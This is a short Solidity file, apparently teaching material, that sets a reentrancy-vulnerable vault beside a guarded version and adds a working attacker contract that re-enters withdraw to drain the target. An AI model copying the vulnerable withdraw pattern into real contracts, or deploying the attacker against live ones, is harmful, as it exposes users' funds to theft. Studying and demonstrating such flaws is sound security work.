// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract VulnerableVault {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "empty");
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "send");
        balances[msg.sender] = 0;
    }
}

contract SafeVault {
    mapping(address => uint256) public balances;
    bool private entered;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        require(!entered, "reentrant");
        entered = true;
        uint256 amount = balances[msg.sender];
        require(amount > 0, "empty");
        balances[msg.sender] = 0;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "send");
        entered = false;
    }
}

contract ReentrantAttacker {
    IVault public immutable target;
    constructor(IVault target_) { target = target_; }
    function attack() external payable {
        require(msg.value == 1 ether, "seed");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
    receive() external payable {
        if (address(target).balance >= 1 ether) target.withdraw();
    }
}
